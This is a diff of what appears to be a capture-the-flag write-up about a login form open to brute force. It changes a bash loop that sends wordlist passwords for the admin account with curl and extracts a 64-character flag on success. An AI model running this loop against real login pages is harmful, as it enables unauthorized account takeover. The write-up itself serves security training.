@@ -28,14 +28,14 @@ The login form at `/?page=signin` is vulnerable to brute force attacks, allowing
   ```
 - Use this brute force loop:
   ```bash
-  for pwd in $(cat pwdlist.txt); do
-    resp=$(curl -s "http://<IP_ADDRESS>/?page=signin&username=admin&password=$pwd&Login=Login")
-    if [[ "$resp" == *"The flag is :"* ]]; then
-      flag=$(echo "$resp" | awk -F 'The flag is :' '{print $2}' | head -n1 | cut -c2-65)
-      echo "Success! Username: admin | Password: $pwd | Flag: $flag"
-      break
-    fi
-  done
+  for pwd in $(cat pwdlist.txt); do 
+  resp=$(curl -s "http://{IP_ADDRESS}/?page=signin&username=admin&password=$pwd&Login=Login")
+  if [[ "$resp" == *"The flag is :"* ]]; then 
+    flag=$(echo "$resp" | grep -oP 'The flag is : \K[a-f0-9]{64}')
+    echo "Success! Username: admin | Password: $pwd | Flag: $flag"
+    break
+  fi
+done
   ```
 - Password `shadow` is found to work.
 
